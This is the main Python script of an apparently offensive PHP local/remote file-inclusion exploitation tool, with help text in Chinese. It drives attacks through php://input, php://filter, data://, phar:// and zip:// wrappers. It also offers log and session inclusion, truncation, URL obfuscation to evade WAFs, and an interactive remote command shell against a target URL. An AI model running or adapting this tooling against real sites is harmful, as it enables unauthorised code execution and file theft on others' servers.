# -*- coding: utf-8 -*-
# @Author:varcer
import include
import getopt
import sys
import base64
from conf import conf
import plugins
#conf={}
def start(conf):
    if conf['--uru']:
        conf['url']=plugins.upper_random_url(conf['url'])
    if conf['--lrs']:
        conf['url']=plugins.long_random_string(conf['url'])
    if conf['randomurl']:
        conf['url']=plugins.encodeurl(conf['url'])
    print(conf['url'])
    if '-i' in conf.keys():
        include.fi_input(conf['url'],conf['-i'])
    if '-f' in conf.keys():
        include.fi_filter(conf['url'],conf['-f'],conf['-w'])
    if '-p' in conf.keys():
        include.fi_phar(conf['url'],conf['-p'])
    if '-z' in conf.keys():
        include.fi_zip(conf['url'],conf['-z'])
    if '-d' in conf.keys():
        if conf['-b']:
            conf['-d']=str(base64.b64encode(conf['-d'].encode())).split("'")[1]
            include.data_text(conf['url'],conf['-d'],conf['-b'])
        else:
            conf['-d']=conf['-d']
            include.data_text(conf['url'], conf['-d'])
    if conf['-c']:
        while 1:
            cmd=input(">")
            if cmd=='exit':
                break
            include.CMD(conf['url'],conf['-l'],cmd)
    if '-s' in conf.keys():
        include.session(conf['url'])
    if '-L' in conf.keys():
        include.log(conf['url'])
    if '--dot' in conf.keys():
        include.dot(conf['url'],conf['--dot'],conf['--sum'])

def help():
    print('-i code:allow_url_include = On 调用php://input,上传PHP代码 eg:-i <?php phpinfo();?> ')
    print('-u url:目标url eg:-u url')
    print('-w :True有waf，False无waf,会自动调用相应函数')
    print('-f file name:php://filter 将指定文件以base64输出,可以与-w一起使用 eg:-f index.php')
    print('-p code:phar:// 传一段PHP代码  PHP>=5.30 eg:-p "<?php phpinfo();?>"')
    print('-z code:zip:// 传一段PHP代码  PHP>=5.30 eg:-z "<?php phpinfo();?>"')
    print("-d code:data:text/plain eg:-d '<?php phpinfo();?>'")
    print("    php版本大于等于php5.2， allow_url_fopen = On， allow_url_include = On")
    print("-b :将数据用base64编码，主要用于-d命令")
    print("-l number:启用cmd的等级 1,2,3,defulte")
    print("-c :启用cmd  eg:-c -l 1")
    print("-s session:包含session")
    print("-L :包含log")
    print("-a :身份认证")
    print("--dot :调用点截断技术")
    print("--sum number:截断长度")
    print("--randomurl:随机编码url")
    print('--lrs:login random string 随机长度字符串')
    print('--uru:upper random url,随机改变url大小写')
if __name__=='__main__':
    command,param=getopt.getopt(sys.argv[1:],'-a-h-u:-i:-f:-w-p:-z:-d:-b-c-l:-s:-L',["dot=","sum=",'randomurl','lrs','uru'])
    for op,pa in command:
        if op in '-h':
            help()
            exit()
        if op in '-u':
            conf['url']=pa
        if op in '-i':
            conf['-i']=pa
        if op in '-w':
            conf['-w']=True
        if op in '-f':
            conf['-f']=pa
        if op in '-p':
            conf['-p']=pa
        if op in '-z':
            conf['-z']=pa
        if op in '-d':
            conf['-d']=pa
        if op in '-b':
            conf['-b']=True
        if op in '-c':
            conf['-c']=True
        if op in '-l':
            conf['-l']=pa
        if op in '-s':
            conf['-s']=pa
        if op in '-L':
            conf['-L']=''
        if op in '-a':
            conf['-a']=True
        if op in '--dot':
            conf['--dot']=pa
        if op in '--sum':
            conf['--sum']=pa
        if op in '--randomurl':
            conf['randomurl']=True
        if op in '--lrs':
            conf['--lrs']=True
        if op in '--uru':
            conf['--uru']=True
    if not conf['url']:
        help()
    else:
        start(conf)
